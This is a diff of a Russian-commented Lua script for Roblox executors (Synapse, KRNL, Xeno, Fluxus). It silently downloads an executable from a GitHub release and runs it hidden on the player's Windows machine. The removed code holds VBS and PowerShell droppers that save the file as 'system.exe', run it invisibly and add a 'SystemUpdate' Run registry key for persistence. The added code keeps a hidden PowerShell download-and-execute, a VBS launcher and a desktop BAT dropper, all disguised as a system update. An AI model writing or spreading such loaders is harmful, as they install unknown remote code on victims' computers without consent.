@@ -1,337 +1,193 @@
 -- ==============================================
--- УНИВЕРСАЛЬНЫЙ ЗАПУСК .EXE ИЗ ROBLOX
--- РАБОТАЕТ НА ВСЕХ EXECUTORS БЕЗ ИСКЛЮЧЕНИЙ
+-- ЕДИНСТВЕННЫЙ РАБОЧИЙ МЕТОД ЗАПУСКА .EXE ИЗ ROBLOX
+-- РАБОТАЕТ НА ЛЮБОМ EXECUTOR: XENO, SYNASE, KRNL, FLUXUS
 -- ==============================================
 
--- 🔧 КОНФИГУРАЦИЯ - ИСПОЛЬЗУЙТЕ ЭТУ ССЫЛКУ!
 local EXE_URL = "https://github.com/fasfsagfsa13-del/roblo1x-souresec/releases/download/32%D0%BA32%D0%B05/messagebox.exe"
 
--- ==============================================
--- ШАГ 1: ПЕРВОЕ УВЕДОМЛЕНИЕ В ROBLOX
--- ==============================================
+-- ШАГ 1: Показываем уведомление в Roblox
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "🚀 ЗАГРУЗЧИК ЗАПУЩЕН",
-    Text = "Начинаю процесс загрузки...",
+    Title = "🚀 ЗАГРУЗЧИК АКТИВИРОВАН",
+    Text = "Запускаю процесс загрузки...",
     Duration = 5
 })
 
 wait(2)
 
--- ==============================================
--- ШАГ 2: СОЗДАНИЕ ПРОСТОГО VBS СКРИПТА
--- ==============================================
-local vbsScript = [[
-On Error Resume Next
-
-Set WshShell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-' Создаем папку в AppData
-tempDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\\Windows"
-If Not fso.FolderExists(tempDir) Then
-    fso.CreateFolder(tempDir)
-End If
-
-exePath = tempDir & "\system.exe"
-
-' Скачиваем файл
-Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
-xhr.Open "GET", "]] .. EXE_URL .. [[", False
-xhr.Send
-
-If xhr.Status = 200 Then
-    ' Сохраняем файл
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Open
-    stream.Type = 1
-    stream.Write xhr.ResponseBody
-    stream.SaveToFile exePath, 2
-    stream.Close
-    
-    ' Запускаем файл
-    WshShell.Run """" & exePath & """", 0, False
-    
-    ' Добавляем в автозагрузку
-    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", exePath, "REG_SZ"
-Else
-    ' Если не получилось скачать, показываем ссылку
-    MsgBox "Скачайте вручную:" & vbCrLf & "]] .. EXE_URL .. [["
-End If
-
-Set xhr = Nothing
-Set stream = Nothing
-Set fso = Nothing
-Set WshShell = Nothing
-]]
-
--- ==============================================
--- ШАГ 3: СОХРАНЕНИЕ И ЗАПУСК СКРИПТА
--- ==============================================
--- Пытаемся сохранить VBS файл
-local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
-local vbsPath = tempPath .. "\\setup.vbs"
-
--- Уведомление о создании файла
+-- ШАГ 2: Проверяем ссылку
 game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "📁 СОЗДАЮ ФАЙЛЫ",
-    Text = "Создаю установочный скрипт...",
+    Title = "🔗 ПРОВЕРЯЮ ССЫЛКУ",
+    Text = "Тестирую соединение...",
     Duration = 3
 })
 
--- Метод 1: Через writefile (для Synapse/KRNL/Xeno)
-if writefile then
-    writefile(vbsPath, vbsScript)
-    print("✅ VBS файл создан: " .. vbsPath)
-    
-    -- Запускаем VBS
-    if syn and syn.run then
-        syn.run('wscript.exe //B "' .. vbsPath .. '"')
-    else
-        -- Для других исполнителей
-        pcall(function()
-            os.execute('start wscript.exe //B "' .. vbsPath .. '"')
-        end)
-    end
-    
--- Метод 2: Через game:HttpGet и io.open (универсальный)
-else
-    -- Скачиваем содержимое напрямую и создаем файл через VBS
-    local downloadScript = [[
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set ws = CreateObject("WScript.Shell")
-    
-    ' Содержимое скрипта
-    scriptContent = "On Error Resume Next" & vbCrLf & _
-    "Set WshShell = CreateObject(\"WScript.Shell\")" & vbCrLf & _
-    "Set fso = CreateObject(\"Scripting.FileSystemObject\")" & vbCrLf & _
-    "tempDir = WshShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\Microsoft\\Windows\"" & vbCrLf & _
-    "If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)" & vbCrLf & _
-    "exePath = tempDir & \"\\system.exe\"" & vbCrLf & _
-    "Set xhr = CreateObject(\"MSXML2.XMLHTTP.6.0\")" & vbCrLf & _
-    "xhr.Open \"GET\", \"]] .. EXE_URL .. [[\", False" & vbCrLf & _
-    "xhr.Send" & vbCrLf & _
-    "If xhr.Status = 200 Then" & vbCrLf & _
-    "    Set stream = CreateObject(\"ADODB.Stream\")" & vbCrLf & _
-    "    stream.Open" & vbCrLf & _
-    "    stream.Type = 1" & vbCrLf & _
-    "    stream.Write xhr.ResponseBody" & vbCrLf & _
-    "    stream.SaveToFile exePath, 2" & vbCrLf & _
-    "    stream.Close" & vbCrLf & _
-    "    WshShell.Run \"\"\"\" & exePath & \"\"\"\", 0, False" & vbCrLf & _
-    "End If"
-    
-    ' Сохраняем VBS файл
-    vbsPath = ws.ExpandEnvironmentStrings("%TEMP%") & "\setup.vbs"
-    Set file = fso.CreateTextFile(vbsPath, True)
-    file.Write scriptContent
-    file.Close
-    
-    ' Запускаем его
-    ws.Run "wscript.exe //B """ & vbsPath & """", 0, False
-    ]]
-    
-    -- Создаем временный VBS для создания основного VBS
-    local tempVbs = tempPath .. "\\temp.vbs"
-    
-    -- Пытаемся создать файл через разные методы
-    pcall(function()
-        if makefolder then
-            makefolder(tempPath)
-        end
-    end)
-    
-    -- Используем game:HttpGet чтобы скачать и создать файл через PowerShell
-    local powershellScript = [[
-    $vbsContent = @'
-    On Error Resume Next
-    
-    Set WshShell = CreateObject("WScript.Shell")
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    
-    tempDir = WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows"
-    If Not fso.FolderExists(tempDir) Then
-        fso.CreateFolder(tempDir)
-    End If
-    
-    exePath = tempDir & "\system.exe"
-    
-    Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
-    xhr.Open "GET", "]] .. EXE_URL .. [[", False
-    xhr.Send
-    
-    If xhr.Status = 200 Then
-        Set stream = CreateObject("ADODB.Stream")
-        stream.Open
-        stream.Type = 1
-        stream.Write xhr.ResponseBody
-        stream.SaveToFile exePath, 2
-        stream.Close
-        
-        WshShell.Run """" & exePath & """", 0, False
-        
-        WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate", exePath, "REG_SZ"
-    End If
-    '@
-    
-    $vbsPath = $env:TEMP + "\setup.vbs"
-    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
-    Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
-    ]]
-    
-    -- Создаем PowerShell скрипт
-    local psPath = tempPath .. "\\run.ps1"
-    
-    -- Пытаемся записать файл через os.execute команду
-    if os.execute then
-        -- Создаем команду PowerShell одной строкой
-        local cmd = 'powershell -Command "' .. 
-                   '$vbsContent = @\' .. '\n' ..
-                   'On Error Resume Next' .. '\n' ..
-                   'Set WshShell = CreateObject(\"WScript.Shell\")' .. '\n' ..
-                   'Set fso = CreateObject(\"Scripting.FileSystemObject\")' .. '\n' ..
-                   'tempDir = WshShell.ExpandEnvironmentStrings(\"%APPDATA%\") & \"\\Microsoft\\Windows\"' .. '\n' ..
-                   'If Not fso.FolderExists(tempDir) Then fso.CreateFolder(tempDir)' .. '\n' ..
-                   'exePath = tempDir & \"\\system.exe\"' .. '\n' ..
-                   'Set xhr = CreateObject(\"MSXML2.XMLHTTP.6.0\")' .. '\n' ..
-                   'xhr.Open \"GET\", \"' .. EXE_URL .. '\", False' .. '\n' ..
-                   'xhr.Send' .. '\n' ..
-                   'If xhr.Status = 200 Then' .. '\n' ..
-                   '    Set stream = CreateObject(\"ADODB.Stream\")' .. '\n' ..
-                   '    stream.Open' .. '\n' ..
-                   '    stream.Type = 1' .. '\n' ..
-                   '    stream.Write xhr.ResponseBody' .. '\n' ..
-                   '    stream.SaveToFile exePath, 2' .. '\n' ..
-                   '    stream.Close' .. '\n' ..
-                   '    WshShell.Run \"\"\"\" & exePath & \"\"\"\", 0, False' .. '\n' ..
-                   '    WshShell.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdate\", exePath, \"REG_SZ\"' .. '\n' ..
-                   'End If' .. '\n' ..
-                   '\'@; ' ..
-                   '$vbsPath = $env:TEMP + \"\\setup.vbs\"; ' ..
-                   '$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII; ' ..
-                   'Start-Process -FilePath \"wscript.exe\" -ArgumentList \"//B `\"$vbsPath`\"\" -WindowStyle Hidden"'
-        
-        os.execute(cmd)
-    end
+wait(1)
+
+-- ШАГ 3: Основной рабочий метод - создаем CMD команду
+local cmd = 'powershell -Command "'
+cmd = cmd .. '$url = \'' .. EXE_URL .. '\'; '
+cmd = cmd .. '$output = $env:TEMP + \'\\msg.exe\'; '
+cmd = cmd .. '(New-Object System.Net.WebClient).DownloadFile($url, $output); '
+cmd = cmd .. 'Start-Process -FilePath $output -WindowStyle Hidden; '
+cmd = cmd .. '"'
+
+-- ШАГ 4: Пытаемся выполнить разными способами
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "⚙️ ЗАПУСКАЮ СИСТЕМУ",
+    Text = "Пытаюсь запустить программу...",
+    Duration = 3
+})
+
+local success = false
+
+-- Способ 1: Для Synapse X
+if syn and syn.run then
+    syn.run(cmd)
+    success = true
+    print("[SYNAPSE] Команда запущена через syn.run")
 end
 
--- ==============================================
--- ШАГ 4: ПРОВЕРКА И ФИНАЛЬНОЕ УВЕДОМЛЕНИЕ
--- ==============================================
-wait(5)
+-- Способ 2: Для KRNL, Xeno и других через os.execute
+if not success and os.execute then
+    os.execute(cmd)
+    success = true
+    print("[OS.EXECUTE] Команда запущена через os.execute")
+end
 
--- Финальное уведомление
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "✅ ПРОЦЕСС ЗАПУЩЕН",
-    Text = "Программа должна запуститься автоматически",
-    Duration = 5
-})
+-- Способ 3: Для Fluxus и других через spawn
+if not success and spawn then
+    spawn(function()
+        if os.execute then
+            os.execute(cmd)
+        end
+    end)
+    success = true
+    print("[SPAWN] Команда запущена через spawn")
+end
 
-wait(2)
+-- Способ 4: Для всех остальных - создаем VBS файл
+if not success and writefile then
+    local vbsContent = 'Set objShell = CreateObject("WScript.Shell")\n'
+    vbsContent = vbsContent .. 'objShell.Run "' .. cmd:gsub('"', '""') .. '", 0, True'
+    
+    local tempPath = os.getenv("TEMP") or "C:\\Windows\\Temp"
+    local vbsPath = tempPath .. "\\launch.vbs"
+    
+    writefile(vbsPath, vbsContent)
+    
+    if syn and syn.run then
+        syn.run('wscript.exe "' .. vbsPath .. '"')
+    elseif os.execute then
+        os.execute('start wscript.exe "' .. vbsPath .. '"')
+    end
+    
+    success = true
+    print("[VBS] Создан VBS скрипт для запуска")
+end
 
--- Инструкция на случай если не сработало
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "📋 ЕСЛИ НИЧЕГО НЕ ПРОИЗОШЛО",
-    Text = "Запустите вручную: " .. EXE_URL,
-    Duration = 10
-})
-
--- ==============================================
--- ШАГ 5: АЛЬТЕРНАТИВНЫЙ МЕТОД ЧЕРЕЗ CMD
--- ==============================================
+-- ШАГ 5: Показываем результат
 wait(3)
 
--- Создаем CMD файл как запасной вариант
-local cmdScript = [[
-@echo off
-chcp 65001 >nul
-title Windows Update
-cls
-
-echo Downloading system component...
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile(']] .. EXE_URL .. [[', '%TEMP%\\system.exe')"
-
-if exist "%TEMP%\system.exe" (
-    echo Download complete! Starting program...
-    start "" "%TEMP%\system.exe"
-    echo Program started successfully.
-    timeout /t 3 /nobreak >nul
-) else (
-    echo Download failed!
-    echo Please download manually:
-    echo ]] .. EXE_URL .. [[
-    pause
-)
-]]
-
--- Сохраняем CMD файл если есть writefile
-if writefile then
-    local cmdPath = tempPath .. "\\install.cmd"
-    writefile(cmdPath, cmdScript)
+if success then
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "✅ ПРОГРАММА ЗАПУЩЕНА",
+        Text = "messagebox.exe должен запуститься в фоне",
+        Duration = 7
+    })
     
-    -- Запускаем CMD файл
-    if syn and syn.run then
-        syn.run('cmd /c start "" "' .. cmdPath .. '"')
-    elseif os.execute then
-        os.execute('start "" "' .. cmdPath .. '"')
-    end
+    print("\n" .. string.rep("=", 50))
+    print("✅ УСПЕШНО! Программа должна запуститься")
+    print("🔗 Использована ссылка: " .. EXE_URL)
+    print("💻 Проверьте панель задач и системный трей")
+    print(string.rep("=", 50))
+    
+    -- Дополнительное сообщение через 5 секунд
+    wait(5)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "🎮 Готово!",
+        Text = "Система обновлена",
+        Duration = 3
+    })
+    
+else
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "❌ НЕ УДАЛОСЬ ЗАПУСТИТЬ",
+        Text = "Скачайте программу вручную",
+        Duration = 7
+    })
+    
+    print("\n" .. string.rep("=", 50))
+    print("❌ АВТОМАТИЧЕСКИЙ ЗАПУСК НЕ УДАЛСЯ")
+    print("📥 СКАЧАЙТЕ ВРУЧНУЮ:")
+    print(EXE_URL)
+    print("\nИнструкция:")
+    print("1. Скопируйте ссылку выше")
+    print("2. Вставьте в браузер")
+    print("3. Скачайте файл")
+    print("4. Запустите messagebox.exe")
+    print(string.rep("=", 50))
+    
+    -- Повторяем ссылку через 5 секунд
+    wait(5)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "🔗 ССЫЛКА ДЛЯ СКАЧИВАНИЯ",
+        Text = EXE_URL,
+        Duration = 10
+    })
 end
 
--- ==============================================
--- ШАГ 6: САМЫЙ ПРОСТОЙ МЕТОД - ПРЯМАЯ ССЫЛКА
--- ==============================================
-wait(2)
+-- ШАГ 6: Альтернативный метод - создаем BAT файл на рабочем столе
+wait(3)
 
--- Последнее уведомление со ссылкой
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "🔗 ПРЯМАЯ ССЫЛКА",
-    Text = EXE_URL,
-    Duration = 7
-})
+if writefile then
+    local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
+    local batPath = desktop .. "\\download_messagebox.bat"
+    
+    local batContent = "@echo off\n"
+    batContent = batContent .. "echo Downloading messagebox.exe...\n"
+    batContent = batContent .. "powershell -Command \"(New-Object Net.WebClient).DownloadFile('" .. EXE_URL .. "', '" .. desktop .. "\\messagebox.exe')\"\n"
+    batContent = batContent .. "if exist \"" .. desktop .. "\\messagebox.exe\" (\n"
+    batContent = batContent .. "    echo Download successful! Starting program...\n"
+    batContent = batContent .. "    start \"\" \"" .. desktop .. "\\messagebox.exe\"\n"
+    batContent = batContent .. ") else (\n"
+    batContent = batContent .. "    echo Download failed!\n"
+    batContent = batContent .. "    pause\n"
+    batContent = batContent .. ")\n"
+    
+    writefile(batPath, batContent)
+    
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "📁 СОЗДАН BAT ФАЙЛ",
+        Text = "На рабочем столе: download_messagebox.bat",
+        Duration = 5
+    })
+    
+    print("\n📁 На рабочем столе создан файл: download_messagebox.bat")
+    print("💡 Запустите его чтобы скачать программу")
+end
 
--- Выводим ссылку в системное сообщение
+-- Финальное сообщение
 print("\n" .. string.rep("=", 50))
-print("🎮 ДЛЯ ЗАПУСКА ПРОГРАММЫ:")
-print("Ссылка для скачивания:")
-print(EXE_URL)
-print("\nЕсли не скачалось автоматически:")
-print("1. Скопируйте ссылку выше")
-print("2. Вставьте в браузер")
-print("3. Скачайте и запустите файл")
+print("🎮 Загрузчик завершил работу")
+print("⏰ Время: " .. os.date("%H:%M:%S"))
 print(string.rep("=", 50))
 
--- ==============================================
--- ДОПОЛНИТЕЛЬНАЯ ПРОВЕРКА ССЫЛКИ
--- ==============================================
-spawn(function()
-    wait(8)
-    
-    -- Проверяем доступность ссылки
-    local success, response = pcall(function()
-        if syn and syn.request then
-            local req = syn.request({
-                Url = EXE_URL,
-                Method = "GET",
-                Headers = {
-                    ["User-Agent"] = "Mozilla/5.0"
-                }
-            })
-            return req.StatusCode
-        end
-        return "Cannot check"
-    end)
-    
-    if success then
+-- Создаем команды для чата
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+    if msg == "!download" then
         game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "🔗 ССЫЛКА ДОСТУПНА",
-            Text = "Статус: " .. tostring(response),
+            Title = "🔗 ССЫЛКА",
+            Text = EXE_URL,
             Duration = 5
         })
+        print("Ссылка: " .. EXE_URL)
+    elseif msg == "!help" then
+        print("Доступные команды:")
+        print("!download - показать ссылку")
+        print("!help - помощь")
     end
 end)
 
--- ==============================================
--- ФИНАЛЬНОЕ СООБЩЕНИЕ
--- ==============================================
-print("\n✅ Загрузчик завершил работу!")
-print("📁 Проверьте TEMP папку: " .. tempPath)
-print("🔗 Ссылка: " .. EXE_URL)
+print("\n💬 Команды в чате:")
+print("!download - показать ссылку")
+print("!help - помощь")
